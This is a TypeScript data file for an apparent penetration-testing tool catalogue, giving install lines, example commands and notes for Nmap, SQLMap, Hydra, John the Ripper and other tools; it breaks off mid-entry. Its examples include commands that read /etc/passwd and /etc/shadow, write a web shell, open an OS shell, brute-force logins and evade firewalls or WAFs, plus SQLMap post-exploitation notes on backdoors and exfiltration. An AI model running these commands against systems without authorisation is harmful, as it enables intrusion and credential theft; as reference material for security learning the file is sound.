
export interface Tool {
  id: string;
  name: string;
  description: string;
  category: string;
  categoryId: string;
  usage?: string;
  installation?: string;
  examples?: { title: string; code: string }[];
  documentation?: string;
  githubUrl?: string;
  tags?: string[];
  additionalInfo?: string;
}

export interface ToolCategory {
  id: string;
  name: string;
  description: string;
  tools: Tool[];
}

// Comprehensive data based on the GitHub repository structure
export const toolsCategories: ToolCategory[] = [
  {
    id: "information-gathering",
    name: "Information Gathering",
    description: "Tools for collecting data about target systems and networks to identify potential attack vectors",
    tools: [
      {
        id: "nmap",
        name: "Nmap",
        description: "Network Mapper is a free and open-source utility for network discovery and security auditing",
        category: "Information Gathering",
        categoryId: "information-gathering",
        installation: "sudo apt install nmap",
        usage: "Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. It can identify open ports, detect operating systems, and scan for vulnerabilities.",
        examples: [
          {
            title: "Basic scan of a target",
            code: "nmap 192.168.1.1"
          },
          {
            title: "Scan specific ports",
            code: "nmap -p 80,443 192.168.1.1"
          },
          {
            title: "Aggressive scan (OS, version, script, traceroute)",
            code: "nmap -A 192.168.1.1"
          },
          {
            title: "Stealth SYN scan",
            code: "nmap -sS 192.168.1.0/24"
          },
          {
            title: "Full port scan (all 65535 ports)",
            code: "nmap -p- 192.168.1.1"
          },
          {
            title: "Fast scan (top 100 ports)",
            code: "nmap -F 192.168.1.1"
          },
          {
            title: "UDP scan",
            code: "nmap -sU -p 53,67,161 192.168.1.1"
          },
          {
            title: "OS detection with verbosity",
            code: "nmap -O -v 192.168.1.1"
          },
          {
            title: "Service version detection with intensity",
            code: "nmap -sV --version-intensity 9 192.168.1.1"
          },
          {
            title: "Vulnerability scan using NSE scripts",
            code: "nmap --script=vuln 192.168.1.1"
          },
          {
            title: "SSL/TLS scan",
            code: "nmap --script ssl-enum-ciphers -p 443 192.168.1.1"
          },
          {
            title: "HTTP enumeration",
            code: "nmap --script=http-enum 192.168.1.1"
          },
          {
            title: "Detect firewall/IDS evasion",
            code: "nmap -f -T2 -D RND:10 192.168.1.1"
          },
          {
            title: "Save output in multiple formats",
            code: "nmap -oA scan_results 192.168.1.1"
          },
          {
            title: "Scan from file with targets",
            code: "nmap -iL targets.txt"
          },
          {
            title: "Timing template (paranoid to insane)",
            code: "nmap -T4 192.168.1.0/24"
          }
        ],
        documentation: "Nmap (Network Mapper) is the industry standard for network discovery and security auditing. Created by Gordon Lyon (Fyodor) in 1997, it has evolved into the most powerful open-source scanning tool used by millions worldwide.\n\nCore Capabilities:\n• Host Discovery: Ping sweeps using ICMP, TCP SYN, TCP ACK, UDP, ARP\n• Port Scanning: 11 different scan types (SYN, Connect, UDP, FIN, NULL, Xmas, ACK, Window, Maimon, Idle)\n• OS Fingerprinting: TCP/IP stack fingerprinting with 2,600+ OS signatures\n• Service Detection: Determines application name/version on 9,000+ services\n• Scriptable Interaction: 600+ NSE scripts for vulnerability detection, backdoor identification, network discovery\n\nAdvanced Features:\n• Timing Controls: 6 timing templates (-T0 to -T5) for speed vs stealth trade-offs\n• Firewall/IDS Evasion: Fragment packets, decoy scans, idle scans, spoofing\n• Output Formats: Normal, XML, grepable, script kiddie format\n• IPv6 Support: Full IPv6 scanning capabilities\n• SSL/TLS Analysis: Certificate validation, cipher enumeration, vulnerability checks\n\nNSE Script Categories:\n• auth: Authentication testing\n• broadcast: Network broadcast discovery\n• brute: Brute force attacks\n• default: Default safe scripts\n• discovery: Network/service discovery\n• dos: Denial of service testing\n• exploit: Exploit known vulnerabilities\n• external: Use external resources\n• fuzzer: Fuzzing attacks\n• intrusive: Intrusive tests\n• malware: Malware detection\n• safe: Safe for production\n• version: Enhanced version detection\n• vuln: Vulnerability detection\n\nIndustry Applications:\n• Penetration Testing: Initial reconnaissance and vulnerability assessment\n• Network Inventory: Asset management and network mapping\n• Compliance Auditing: PCI DSS, HIPAA, SOX compliance scanning\n• Incident Response: Forensics and malware detection\n• Security Research: Discovering zero-days and analyzing attack surfaces\n\nPerformance Optimization:\n• Parallel Scanning: Scan multiple hosts simultaneously\n• Rate Limiting: Control scan speed to avoid detection\n• Host Groups: Efficient scanning of large networks\n• Resume Scans: Continue interrupted scans with --resume\n\nBest Practices:\n• Always get written permission before scanning\n• Use -T3 or -T4 for balanced speed/accuracy\n• Combine -sV with --version-light for faster service detection\n• Use --top-ports for quick reconnaissance\n• Enable -v or -vv for real-time feedback\n• Save results with -oA for all formats\n\nCommon Pitfalls:\n• Avoid -T5 (insane) - causes packet loss and missed services\n• UDP scans (-sU) are slow but critical for full assessment\n• Firewalls may block ICMP, use -Pn to skip host discovery\n• Service version detection (-sV) significantly increases scan time\n• NSE scripts can be intrusive - read documentation first",

        githubUrl: "https://github.com/nmap/nmap",
        tags: ["network", "scanner", "reconnaissance", "port scanner"],
        additionalInfo: "Nmap was originally written by Gordon Lyon (also known as Fyodor Vaskovich) and is now maintained by a community of developers. It's available for most operating systems including Windows, macOS, and Linux distributions."
      },
      {
        id: "maltego",
        name: "Maltego",
        description: "Open source intelligence and forensics application, used for gathering and connecting information for visual link analysis",
        category: "Information Gathering",
        categoryId: "information-gathering",
        usage: "Maltego is used for open-source intelligence and forensics to determine the relationships and connections between people, groups, websites, domains, and more. It presents information as nodes on a graph for easy visualization of complex networks.",
        installation: "sudo apt install maltego",
        examples: [
          {
            title: "Launch Maltego",
            code: "maltego"
          }
        ],
        documentation: "Maltego is a visual link analysis tool that is used for gathering and connecting information for investigative tasks. It allows you to mine data from various public sources and visualize this information in a graph format, showing the connections between pieces of information from different sources.",
        githubUrl: "https://github.com/paterva/maltego-trx",
        tags: ["OSINT", "visualization", "reconnaissance", "forensics"],
        additionalInfo: "Maltego is developed by Paterva and is available in both free Community Edition and commercial versions. It's widely used by security researchers, private investigators, and law enforcement agencies."
      },
      {
        id: "the-harvester",
        name: "TheHarvester",
        description: "Tool for gathering e-mail accounts, subdomain names, virtual hosts, open ports, and banners from different public sources",
        category: "Information Gathering",
        categoryId: "information-gathering",
        installation: "sudo apt install theharvester",
        usage: "TheHarvester is used to gather open source intelligence (OSINT) on a company or domain by extracting information from various public sources",
        examples: [
          {
            title: "Basic scan of a domain",
            code: "theharvester -d example.com -l 100 -b all"
          },
          {
            title: "Search using specific data source",
            code: "theharvester -d example.com -b linkedin"
          },
          {
            title: "Save results to XML file",
            code: "theharvester -d example.com -b all -f results.xml"
          }
        ],
        documentation: "TheHarvester is designed to help security professionals during the early stages of a penetration test to gather email addresses, subdomains, hosts, employee names, open ports, and banners from different public sources like search engines, PGP key servers, and SHODAN.",
        githubUrl: "https://github.com/laramies/theHarvester",
        tags: ["OSINT", "email", "subdomain", "reconnaissance"]
      },
      {
        id: "recon-ng",
        name: "Recon-ng",
        description: "Full-featured reconnaissance framework designed with a modular approach for web-based open source reconnaissance",
        category: "Information Gathering",
        categoryId: "information-gathering",
        installation: "sudo apt install recon-ng",
        usage: "Recon-ng provides a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly",
        examples: [
          {
            title: "Start Recon-ng",
            code: "recon-ng"
          },
          {
            title: "Add domain to workspace",
            code: "recon-ng\nworkspaces add example\ndb insert domains example.com"
          },
          {
            title: "Run module",
            code: "recon-ng\nmodules load recon/domains-hosts/google_site_web\nrun"
          }
        ],
        documentation: "Recon-ng is a full-featured reconnaissance framework designed with a modular approach and streamlined workflow in mind. Recon-ng has a look and feel similar to the Metasploit Framework, reducing the learning curve for leveraging the framework.",
        githubUrl: "https://github.com/lanmaster53/recon-ng",
        tags: ["reconnaissance", "OSINT", "framework", "modular"]
      }
    ]
  },
  {
    id: "vulnerability-analysis",
    name: "Vulnerability Analysis",
    description: "Tools for identifying and analyzing security vulnerabilities in networks and applications",
    tools: [
      {
        id: "nikto",
        name: "Nikto",
        description: "Web server scanner which performs comprehensive tests against web servers for multiple items",
        category: "Vulnerability Analysis",
        categoryId: "vulnerability-analysis",
        installation: "sudo apt install nikto",
        usage: "Nikto is used to scan web servers for known vulnerabilities and misconfigurations. It checks for over 6700 potentially dangerous files/CGIs, outdated server versions, and specific problems on servers.",
        examples: [
          {
            title: "Basic scan",
            code: "nikto -h http://example.com"
          },
          {
            title: "Full scan with SSL",
            code: "nikto -h https://example.com -ssl"
          },
          {
            title: "Scan specific port",
            code: "nikto -h example.com -p 8080"
          },
          {
            title: "Save output to file",
            code: "nikto -h example.com -o report.html -Format html"
          }
        ],
        documentation: "Nikto is an open source web server scanner that performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/CGIs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers.",
        githubUrl: "https://github.com/sullo/nikto",
        tags: ["web", "scanner", "vulnerability", "webserver"],
        additionalInfo: "Nikto was originally written by Chris Sullo and is now maintained by a community of developers. It's included by default in many penetration testing Linux distributions like Kali Linux."
      },
      {
        id: "openvas",
        name: "OpenVAS",
        description: "Open Vulnerability Assessment Scanner is a framework of tools for vulnerability scanning and management",
        category: "Vulnerability Analysis",
        categoryId: "vulnerability-analysis",
        installation: "sudo apt install openvas",
        usage: "OpenVAS is used for network vulnerability scanning and management. It can identify security issues in systems and applications across networks.",
        examples: [
          {
            title: "Start OpenVAS",
            code: "sudo gvm-start"
          },
          {
            title: "Access web interface",
            code: "firefox https://localhost:9392"
          },
          {
            title: "Create a new task",
            code: "gvm-cli --gmp-username admin --gmp-password admin socket --xml \"<create_task><name>Scan</name><target id='target_id'/></create_task>\""
          }
        ],
        documentation: "OpenVAS (Open Vulnerability Assessment System) is a comprehensive vulnerability scanning and management solution. It consists of several services and tools that work together to perform scans, analyze vulnerabilities, and present results in a structured format.",
        tags: ["vulnerability", "scanner", "management", "network"],
        additionalInfo: "OpenVAS is part of the Greenbone Vulnerability Management (GVM) solution. It includes a regularly updated feed of vulnerability tests and can be integrated with other security tools."
      },
      {
        id: "wapiti",
        name: "Wapiti",
        description: "Web application vulnerability scanner that audits the security of web applications",
        category: "Vulnerability Analysis",
        categoryId: "vulnerability-analysis",
        installation: "sudo apt install wapiti",
        usage: "Wapiti scans web applications by identifying script injection points and injecting payloads to detect vulnerabilities",
        examples: [
          {
            title: "Basic scan",
            code: "wapiti -u http://example.com/"
          },
          {
            title: "Specific module scan",
            code: "wapiti -u http://example.com/ -m sql,xss"
          },
          {
            title: "Generate HTML report",
            code: "wapiti -u http://example.com/ -f html -o report"
          }
        ],
        documentation: "Wapiti allows you to audit the security of your web applications. It performs black-box scans to find vulnerabilities such as SQL injections, XSS, CRLF injections, command execution, XXE injections, and more.",
        githubUrl: "https://github.com/wapiti-scanner/wapiti",
        tags: ["web", "scanner", "injection", "audit"]
      }
    ]
  },
  {
    id: "web-application-analysis",
    name: "Web Application Analysis",
    description: "Tools for analyzing and exploiting web applications to identify security issues",
    tools: [
      {
        id: "burpsuite",
        name: "Burp Suite",
        description: "An integrated platform for performing security testing of web applications",
        category: "Web Application Analysis",
        categoryId: "web-application-analysis",
        installation: "Download from PortSwigger website",
        usage: "Burp Suite is used as a proxy for intercepting and modifying HTTP/S traffic between a browser and web servers. It provides a comprehensive suite of tools for web application penetration testing.",
        examples: [
          {
            title: "Start Burp Suite Community Edition",
            code: "burpsuite"
          },
          {
            title: "Configure browser proxy (Firefox/Chrome)",
            code: "Settings > Network > Manual proxy configuration\nHTTP Proxy: 127.0.0.1\nPort: 8080\n☑ Also use this proxy for HTTPS"
          },
          {
            title: "Install CA certificate",
            code: "1. Visit http://burp in browser\n2. Download CA certificate\n3. Import to browser's certificate store"
          },
          {
            title: "Enable intercept",
            code: "Proxy > Intercept > Intercept is on\n(Click 'Forward' to send requests)"
          },
          {
            title: "Send request to Repeater",
            code: "Right-click on request > Send to Repeater\n(Modify and resend requests manually)"
          },
          {
            title: "Send to Intruder for fuzzing",
            code: "Right-click > Send to Intruder\nPositions > Add § markers\nPayloads > Load wordlist\nStart attack"
          },
          {
            title: "Use Decoder for encoding",
            code: "Decoder tab > Paste text\nEncode as: URL, HTML, Base64, Hex\nDecode: Auto-detect encoding"
          },
          {
            title: "Compare site maps",
            code: "Target > Site map > Right-click domain\nEngagement tools > Compare site maps"
          },
          {
            title: "Active scan (Pro only)",
            code: "Right-click on request\nScan > Active scan\nSelect scan type and start"
          },
          {
            title: "Session handling rules",
            code: "Project options > Sessions\nAdd session handling rule\nScope: Select tools"
          },
          {
            title: "Match and Replace rules",
            code: "Proxy > Options > Match and Replace\nAdd rule to modify requests/responses"
          },
          {
            title: "Save project state (Pro)",
            code: "Project > Save project\nFile > Save state snapshot"
          }
        ],
        documentation: "Burp Suite is the leading web application security testing platform developed by PortSwigger. Used by over 100,000 security professionals worldwide, it's the de facto standard for web app penetration testing.\n\nCore Tools & Modules:\n• Proxy: Intercepts and modifies HTTP/HTTPS traffic between browser and server. Features include history, WebSocket support, match/replace rules, response interception\n• Repeater: Manual request manipulation and testing. Send modified requests, compare responses, analyze variations\n• Intruder: Automated fuzzing and payload delivery. Four attack types: Sniper, Battering ram, Pitchfork, Cluster bomb\n• Scanner (Pro): Automated vulnerability detection for OWASP Top 10, injection flaws, misconfigurations\n• Decoder: Encode/decode data in multiple formats. Smart analysis, custom encoding\n• Comparer: Visual diff tool for analyzing subtle differences between responses\n• Sequencer: Analyze session token randomness and predictability\n• Extender: 300+ BApp Store extensions for custom functionality\n\nProfessional Features (Pro Edition):\n• Automated Scanning: Passive and active vulnerability detection\n• Scan Scheduling: Automated periodic scans\n• Collaborator: Out-of-band interaction testing (XXE, SSRF, DNS queries)\n• Save/Resume: Project files with complete state\n• Scan Configurations: Custom scan profiles and policies\n• Reporting: Professional HTML/XML reports with evidence\n• Task Scheduler: Automated scanning workflows\n\nAdvanced Testing Techniques:\n• Session Token Analysis: Test authentication mechanisms for weaknesses\n• Race Conditions: Use Turbo Intruder extension for timing attacks\n• DOM-Based XSS: Analyze client-side JavaScript execution\n• Blind Injection: Use Collaborator for out-of-band detection\n• CSRF Testing: Generate POC forms automatically\n• API Testing: Parse OpenAPI/Swagger specs, test REST/GraphQL\n• WebSocket Testing: Intercept and modify WebSocket frames\n• HTTP/2: Full support for HTTP/2 protocol testing\n\nIntruder Attack Types:\n• Sniper: Single payload set, one position at a time (SQL injection)\n• Battering Ram: Same payload in all positions (credential stuffing)\n• Pitchfork: Multiple payload sets, iterate together (username:password pairs)\n• Cluster Bomb: Multiple payload sets, all combinations (brute force)\n\nKey Extensions (BApps):\n• Autorize: Automated authorization testing\n• Logger++: Advanced logging and grep functionality\n• Active Scan++: Enhanced vulnerability checks\n• Param Miner: Discover hidden parameters\n• JSON Web Tokens: JWT manipulation and attacks\n• Retire.js: Identify vulnerable JavaScript libraries\n• Turbo Intruder: High-speed race condition testing\n• Upload Scanner: File upload vulnerability detection\n\nPenetration Testing Workflow:\n1. Setup: Configure proxy, install CA cert, set scope\n2. Mapping: Spider/crawl application, discover endpoints\n3. Analysis: Review site map, identify attack surface\n4. Testing: Manual testing with Repeater, automated with Intruder\n5. Validation: Confirm vulnerabilities with different payloads\n6. Exploitation: Develop POCs, test impact\n7. Reporting: Document findings with evidence\n\nBest Practices:\n• Define Target Scope: Avoid testing out-of-scope domains\n• Use Display Filters: Filter HTTP history for relevant requests\n• Master Hotkeys: Ctrl+R (Repeater), Ctrl+I (Intruder), Ctrl+Shift+B (Base64)\n• Session Handling: Configure auto-login for authenticated testing\n• Throttle Requests: Use Intruder resource pool to control speed\n• Backup Projects: Save project state regularly (Pro)\n• Use Extensions: Leverage BApp Store for specialized testing\n• Configure Match/Replace: Automate header injection, token refresh\n\nCommon Testing Scenarios:\n• SQL Injection: Use Intruder with SQL payloads, analyze response times\n• XSS Testing: Inject scripts, check reflected output encoding\n• IDOR: Test sequential IDs, modify user-specific parameters\n• CSRF: Check anti-CSRF tokens, test referer validation\n• Authentication: Test password reset, session fixation, brute force\n• Authorization: Test privilege escalation, missing access controls\n• File Upload: Test file type validation, path traversal, XXE\n• Business Logic: Test workflow bypasses, race conditions\n\nPerformance Tips:\n• Disable passive scanning on large sites\n• Use match/replace instead of extensions when possible\n• Clear proxy history periodically\n• Increase Java heap size for large projects\n• Use Repeater tabs efficiently - close unused tabs\n• Filter Intruder results before analysis",
        githubUrl: "https://portswigger.net/burp",
        tags: ["web", "proxy", "interception", "testing", "scanner"],
        additionalInfo: "Burp Suite is available in Community (free) and Professional (paid) editions. The Professional edition includes additional features such as a scanner, collaborator, and project saving capabilities."
      },
      {
        id: "sqlmap",
        name: "SQLMap",
        description: "Automatic SQL injection and database takeover tool",
        category: "Web Application Analysis",
        categoryId: "web-application-analysis",
        installation: "sudo apt install sqlmap",
        usage: "SQLMap is used to detect and exploit SQL injection flaws in web applications. It automates the process of detecting and exploiting SQL injection vulnerabilities and taking over database servers.",
        examples: [
          {
            title: "Basic URL parameter injection test",
            code: "sqlmap -u \"http://example.com/page.php?id=1\""
          },
          {
            title: "POST request injection",
            code: "sqlmap -u \"http://example.com/login\" --data=\"username=admin&password=test\""
          },
          {
            title: "Test with authentication cookies",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --cookie=\"PHPSESSID=abc123\""
          },
          {
            title: "Enumerate databases",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --dbs"
          },
          {
            title: "Enumerate tables in specific database",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" -D database_name --tables"
          },
          {
            title: "Dump specific table",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" -D database_name -T users --dump"
          },
          {
            title: "Dump specific columns",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" -D database_name -T users -C username,password --dump"
          },
          {
            title: "Get database banner and version",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --banner"
          },
          {
            title: "Get current user and database",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --current-user --current-db"
          },
          {
            title: "Test all parameters automatically",
            code: "sqlmap -u \"http://example.com/page.php?id=1&cat=2\" --level=5 --risk=3"
          },
          {
            title: "Specify injection technique",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --technique=BEUSTQ"
          },
          {
            title: "Time-based blind injection",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --technique=T --time-sec=5"
          },
          {
            title: "Read file from server",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --file-read=\"/etc/passwd\""
          },
          {
            title: "Write file to server",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --file-write=\"shell.php\" --file-dest=\"/var/www/html/shell.php\""
          },
          {
            title: "OS command execution",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --os-cmd=\"whoami\""
          },
          {
            title: "Get OS shell",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --os-shell"
          },
          {
            title: "SQL shell access",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --sql-shell"
          },
          {
            title: "Test specific DBMS",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --dbms=mysql"
          },
          {
            title: "Use proxy for requests",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --proxy=\"http://127.0.0.1:8080\""
          },
          {
            title: "Tamper scripts for WAF bypass",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --tamper=space2comment,between"
          },
          {
            title: "Batch mode (non-interactive)",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --batch --dbs"
          },
          {
            title: "Verbose output for debugging",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" -v 3"
          }
        ],
        documentation: "SQLMap is the world's most popular open-source SQL injection automation tool. Developed by Bernardo Damele and Miroslav Stampar, it's capable of detecting and exploiting SQL injection vulnerabilities in web applications with support for over 10 database management systems.\\n\\nSupported Databases:\\n• MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite\\n• Microsoft Access, IBM DB2, Informix, SAP MaxDB, Sybase\\n• Firebird, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift\\n\\nInjection Techniques (BEUSTQ):\\n• B - Boolean-based blind: True/False responses (slow but reliable)\\n• E - Error-based: Extract data from error messages\\n• U - UNION query-based: Append results to original query (fastest)\\n• S - Stacked queries: Execute multiple statements (INSERT, UPDATE, DELETE)\\n• T - Time-based blind: Measure response delays (slowest, most stealthy)\\n• Q - Inline queries: Nested queries in SELECT statements\\n\\nDetection and Exploitation:\\n• Fingerprinting: Automatically detects DBMS type, version, architecture\\n• Enumeration: Databases, tables, columns, users, privileges, passwords\\n• Data Extraction: Dump entire databases or specific tables/columns\\n• Authentication Bypass: Exploit authentication mechanisms\\n• Password Cracking: Built-in dictionary attacks for hashed passwords\\n• Search: Find specific data across databases (SSN, emails, usernames)\\n\\nAdvanced Features:\\n• File System Access: Read/write files on the database server\\n• OS Command Execution: Execute system commands via database functions\\n• OS Shell: Get interactive shell access\\n• Registry Access: Read/write Windows registry (MSSQL)\\n• Out-of-Band Attacks: DNS exfiltration, HTTP requests\\n• Takeover: Full database and OS takeover capabilities\\n\\nRisk and Level Parameters:\\n• --level (1-5): Test depth. Higher = more payloads, slower\\n  • Level 1: GET parameters only\\n  • Level 2: POST parameters, cookies\\n  • Level 3: HTTP User-Agent, Referer\\n  • Level 4: HTTP headers\\n  • Level 5: All possible injection points\\n• --risk (1-3): Payload aggressiveness\\n  • Risk 1: Safe payloads (default)\\n  • Risk 2: Heavy query time-based payloads\\n  • Risk 3: OR-based injection (may corrupt data)\\n\\nWAF Bypass Techniques:\\n• Tamper Scripts: 50+ bypass scripts for various WAFs\\n  • space2comment: Replace space with comment\\n  • between: Replace greater than with NOT BETWEEN\\n  • equaltolike: Replace equals with LIKE\\n  • charencode: URL encode characters\\n  • base64encode: Base64 encode entire payload\\n  • versionedkeywords: Use version-specific comments\\n• Randomization: --randomize parameter values\\n• User-Agent: --random-agent for different UA strings\\n• Delay: --delay between requests\\n• Chunked Encoding: --chunked HTTP transfer encoding\\n\\nDatabase-Specific Exploitation:\\n• MySQL: LOAD_FILE(), INTO OUTFILE, User-Defined Functions\\n• PostgreSQL: COPY TO/FROM, large objects\\n• MSSQL: xp_cmdshell, OLE automation, CLR assemblies\\n• Oracle: UTL_FILE, DBMS packages, Java stored procedures\\n\\nPost-Exploitation:\\n• Privilege Escalation: Identify and exploit weak configurations\\n• Lateral Movement: Enumerate network, linked servers\\n• Persistence: Create database users, backdoors\\n• Data Exfiltration: Scheduled dumps, automated extraction\\n• Cleanup: Remove traces, restore original state\\n\\nBest Practices:\\n• Start with level 1, risk 1 to avoid data corruption\\n• Use --batch for automated scanning\\n• Always test on authorized targets only\\n• Use --threads for faster enumeration (2-10 threads)\\n• Save session data with --session for resuming\\n• Use --flush-session to force fresh detection\\n• Log everything with --output-dir\\n• Test manually first with simple payloads\\n• Verify findings with multiple techniques\\n\\nCommon Pitfalls:\\n• False Positives: Verify with --string or --not-string\\n• WAF Blocking: Use tamper scripts and delay\\n• Time-Based Delays: Slow networks cause false positives\\n• Complex Parameters: May need --skip-static\\n• Cookie-Based Injection: Remember to mark with asterisk\\n• POST with CSRF: May need --csrf-token\\n\\nIntegration:\\n• Burp Suite: Use --proxy to route through Burp\\n• API Mode: Python API for custom scripts\\n• CI/CD: Automate security testing\\n• Bug Bounty: Automated initial assessment\\n\\nReal-World Scenarios:\\n• Authentication Bypass: Test login forms, password resets\\n• Admin Panel Discovery: Enumerate tables for admin_users\\n• Data Breach Simulation: Extract customer data for impact assessment\\n• Compliance Testing: Verify SQL injection protections (PCI DSS)\\n• Security Research: Discover zero-days in popular CMSs",
        githubUrl: "https://github.com/sqlmapproject/sqlmap",
        tags: ["sql injection", "exploitation", "database", "automation"],
        additionalInfo: "SQLMap supports a wide range of database management systems including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, and many others. It can work with different injection techniques and bypass various protection mechanisms."
      },
      {
        id: "owasp-zap",
        name: "OWASP ZAP",
        description: "Open Web Application Security Project Zed Attack Proxy is a free security tool for finding vulnerabilities in web applications",
        category: "Web Application Analysis",
        categoryId: "web-application-analysis",
        installation: "sudo apt install zaproxy",
        usage: "OWASP ZAP is used as both an automated scanner and manual testing tool for web application security assessments",
        examples: [
          {
            title: "Start ZAP",
            code: "zaproxy"
          },
          {
            title: "Quick scan from command line",
            code: "zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://example.com"
          },
          {
            title: "Generate HTML report",
            code: "zap-cli report -o report.html -f html"
          }
        ],
        documentation: "OWASP ZAP (Zed Attack Proxy) is a free, open-source penetration testing tool being maintained under the Open Web Application Security Project (OWASP). ZAP is designed specifically for testing web applications and is both flexible and extensible.",
        githubUrl: "https://github.com/zaproxy/zaproxy",
        tags: ["web", "proxy", "scanner", "OWASP", "penetration testing"]
      }
    ]
  },
  {
    id: "password-attacks",
    name: "Password Attacks",
    description: "Tools for attacking password-based authentication systems to identify weak credentials",
    tools: [
      {
        id: "hydra",
        name: "Hydra",
        description: "Fast and flexible online password cracking tool",
        category: "Password Attacks",
        categoryId: "password-attacks",
        installation: "sudo apt install hydra",
        usage: "Hydra is used to brute force credentials for various network services. It supports numerous protocols including FTP, HTTP, HTTPS, SMB, SSH, and many more.",
        examples: [
          {
            title: "SSH brute force",
            code: "hydra -l user -P passwordlist.txt ssh://192.168.1.1"
          },
          {
            title: "HTTP form brute force",
            code: "hydra -l admin -P passwordlist.txt 192.168.1.1 http-post-form \"/login:username=^USER^&password=^PASS^:F=Login failed\""
          },
          {
            title: "FTP brute force with verbose output",
            code: "hydra -l user -P passwordlist.txt ftp://192.168.1.1 -v"
          },
          {
            title: "Multiple services scan",
            code: "hydra -L users.txt -P passwords.txt 192.168.1.1 ssh ftp mysql"
          }
        ],
        documentation: "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system.",
        githubUrl: "https://github.com/vanhauser-thc/thc-hydra",
        tags: ["brute force", "password", "authentication", "cracking", "login"],
        additionalInfo: "THC-Hydra is maintained by van Hauser and was developed as part of THC (The Hackers Choice) group's tools. It's considered one of the fastest network login crackers with support for more than 50 protocols and services."
      },
      {
        id: "john",
        name: "John the Ripper",
        description: "Password security auditing and password recovery tool",
        category: "Password Attacks",
        categoryId: "password-attacks",
        installation: "sudo apt install john",
        usage: "John the Ripper is used to crack password hashes and perform password auditing. It combines several cracking modes and is highly customizable with external cracking rules.",
        examples: [
          {
            title: "Basic password cracking",
            code: "john hashes.txt"
          },
          {
            title: "Crack MD5 hashes",
            code: "john --format=raw-md5 hashes.txt"
          },
          {
            title: "Show cracked passwords",
            code: "john --show hashes.txt"
          },
          {
            title: "Wordlist attack with rules",
            code: "john --wordlist=rockyou.txt --rules hashes.txt"
          },
          {
            title: "Benchmark all hash types",
            code: "john --test --format=all"
          },
          {
            title: "Incremental mode (brute force)",
            code: "john --incremental=Alnum hashes.txt"
          },
          {
            title: "Crack Linux shadow file",
            code: "unshadow /etc/passwd /etc/shadow > mypasswd\\njohn mypasswd"
          },
          {
            title: "Crack Windows NTLM hashes",
            code: "john --format=NT hashes.txt"
          },
          {
            title: "Crack bcrypt hashes",
            code: "john --format=bcrypt hashes.txt"
          },
          {
            title: "Crack SHA-512 crypt hashes",
            code: "john --format=sha512crypt shadow.txt"
          },
          {
            title: "Use specific wordlist without rules",
            code: "john --wordlist=custom.txt --rules=None hashes.txt"
          },
          {
            title: "Single crack mode (user info based)",
            code: "john --single hashes.txt"
          },
          {
            title: "Mask attack (hybrid)",
            code: "john --mask='?l?l?l?l?d?d?d?d' hashes.txt"
          },
          {
            title: "Resume interrupted session",
            code: "john --restore"
          },
          {
            title: "Use multiple CPU cores",
            code: "john --fork=4 hashes.txt"
          },
          {
            title: "Crack PDF passwords",
            code: "pdf2john.pl document.pdf > pdf.hash\\njohn pdf.hash"
          },
          {
            title: "Crack ZIP file passwords",
            code: "zip2john archive.zip > zip.hash\\njohn zip.hash"
          },
          {
            title: "Crack SSH private key passphrases",
            code: "ssh2john.py id_rsa > ssh.hash\\njohn --wordlist=rockyou.txt ssh.hash"
          }
        ],
        documentation: "John the Ripper is a legendary password cracking tool, first released by Solar Designer in 1996. It combines multiple cracking modes and supports hundreds of hash and cipher types, making it one of the most versatile password auditing tools available. Available in both free (core) and community-enhanced (Jumbo) versions.\\n\\nSupported Hash Types (200+):\\n• Unix crypt: Traditional DES, MD5, Blowfish (bcrypt), SHA-256, SHA-512\\n• Windows: LM, NTLM, NTLMv1, NTLMv2, Kerberos\\n• Network protocols: MD5-Challenge, NETHALFLM, MSCHAPv2\\n• Web applications: phpBB3, Drupal7, Joomla, WordPress\\n• Databases: MySQL, PostgreSQL, Oracle, MSSQL\\n• File formats: PDF, ZIP, RAR, Office, KeePass, 1Password\\n• Modern hashes: bcrypt, scrypt, Argon2, PBKDF2\\n• Cryptocurrencies: Bitcoin, Ethereum wallet files\\n\\nCracking Modes:\\n• Single Crack Mode:\\n  • Uses username and GECOS information\\n  • Applies intelligent transformations (John, john, JOHN, j0hn)\\n  • Fast initial pass before other modes\\n  • Effective against lazy users\\n• Wordlist Mode:\\n  • Dictionary-based attack\\n  • Processes wordlist with rule transformations\\n  • Supports pipes for dynamic wordlist generation\\n  • Can combine multiple wordlists\\n• Incremental Mode (Brute Force):\\n  • True brute force, tries all combinations\\n  • Uses character frequency analysis\\n  • Configurable character sets (Alnum, Alpha, Digits, ASCII)\\n  • Continues where it left off on restart\\n  • Extremely slow but guaranteed to find password\\n• Mask Mode:\\n  • Hybrid attack with position-specific characters\\n  • ?l = lowercase, ?u = uppercase, ?d = digits, ?s = symbols\\n  • ?a = all printable ASCII\\n  • Example: Password123 = ?u?l?l?l?l?l?l?l?d?d?d\\n\\nWord Mangling Rules:\\n• Built-in rulesets: Single, Wordlist, NT, Jumbo\\n• Operations: Append, prepend, duplicate, reverse\\n• Case modifications: Capitalize, lowercase, toggle\\n• Character substitution: a→@, e→3, 